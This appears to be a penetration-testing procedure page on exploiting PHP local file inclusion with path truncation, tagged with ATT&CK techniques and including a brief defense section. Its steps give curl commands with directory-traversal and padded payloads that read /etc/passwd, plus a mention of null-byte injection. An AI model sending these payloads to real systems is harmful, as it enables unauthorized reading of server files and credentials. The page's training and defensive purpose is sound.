---
type: procedure
description: >-
  Exploit a local file inclusion vulnerability using path truncation techniques
  to bypass input filters and read sensitive files on the web server.
verified: true
submitted: false
created_at: '2023-04-06T03:55:58.117950+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Collection|TA0009 - Collection]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
sub_techniques: []
tags:
  - lfi
  - file-inclusion
  - path-truncation
  - web-exploitation
commands:
  - '[[commands/curl-lfi-path-truncation]]'
platforms:
  - Web
  - PHP
tools: []
validated: true
---

# Basic-LFI-with-Path-Truncation

## Summary

This procedure demonstrates how to exploit a Local File Inclusion (LFI) vulnerability in a web application by using path truncation techniques. By appending excessive dots, slashes, or null characters to the file path parameter, attackers can bypass directory traversal filters and read sensitive local files such as /etc/passwd on the server. This is commonly applicable to PHP-based applications with insufficient input sanitization.

## Description

Local File Inclusion (LFI) vulnerabilities occur when a web application dynamically includes files based on user-supplied input without proper validation, allowing attackers to read arbitrary files on the server. Path truncation exploits this by leveraging how PHP and web servers handle long paths—typically truncating filenames longer than 4096 bytes, which can nullify trailing filters or allow traversal beyond restricted directories. This technique is useful in reconnaissance phases to extract configuration files, passwords, or system information. It assumes the application uses a parameter like ?page= or ?file= for file inclusion and lacks defenses like basename() wrapping or allowlisting.

## Requirements

1. Access to a vulnerable web application with an LFI entry point (e.g., via browser or proxy).
2. Knowledge of the vulnerable parameter (e.g., ?page=).
3. A tool like curl or Burp Suite for sending crafted HTTP requests.
4. Basic understanding of the target server's file system (e.g., Linux paths like /etc/passwd).

## Defense

- Implement strict input validation and sanitization, such as using basename() or whitelisting allowed files.
- Deploy a Web Application Firewall (WAF) to detect and block path traversal patterns like ../ or excessive dots/slashes.
- Restrict file system access for the web server process using chroot or AppArmor/SELinux.
- Enable logging of file inclusion attempts and monitor for anomalous file access.

## Objectives

1. Bypass input filters to traverse directories and access sensitive files.
2. Extract server-side files like /etc/passwd, configuration files, or logs.
3. Gather information for further exploitation, such as credentials or application secrets.

## Instructions

### Step 1: Identify the Vulnerable Parameter

**Context**: Determine the file inclusion parameter by testing the application. Look for endpoints that load content based on user input, such as index.php?page=home.php.

Submit a basic request to confirm the parameter accepts file paths.

**Command** ([[commands/curl-lfi-path-truncation]]):
```bash
curl "http://example.com/index.php?page=../../../etc/passwd" -v
```

> This sends a traversal payload to attempt reading /etc/passwd. Observe if the response includes file contents or errors indicating partial success.

### Step 2: Apply Path Truncation to Bypass Filters

**Context**: If direct traversal is blocked, append excessive characters to truncate the path after filters are applied. PHP often truncates long paths, allowing the effective path to resolve to the target file.

Use variations with multiple dots, slashes, or backslashes to evade normalization.

**Command** ([[commands/curl-lfi-path-truncation]]):
```bash
curl "http://example.com/index.php?page=../../../etc/passwd............" -v
curl "http://example.com/index.php?page=../../../etc/passwd\\..\\..\\.." -v
curl "http://example.com/index.php?page=../../../etc/passwd/./././././." -v
curl "http://example.com/index.php?page=../../../....................../etc/passwd" -v
```

> Replace example.com with the target URL and adjust the parameter. The excessive characters (e.g., 4096+ dots) cause truncation, bypassing filters that check for ../ patterns. Expected output includes the contents of /etc/passwd if successful, such as user entries starting with root:x:0:0.

### Step 3: Verify and Extract File Contents

**Context**: Confirm success by checking for file contents in the response. If partial output appears, refine the payload length or try null byte injections (%00) for older PHP versions.

Save the output for analysis.

**Command** ([[commands/curl-lfi-path-truncation]]):
```bash
curl "http://example.com/index.php?page=../../../etc/passwd" -o lfi_output.txt -v
cat lfi_output.txt
```

> Review the saved file for sensitive data. Success is indicated by readable file contents rather than 404 errors or filtered responses.
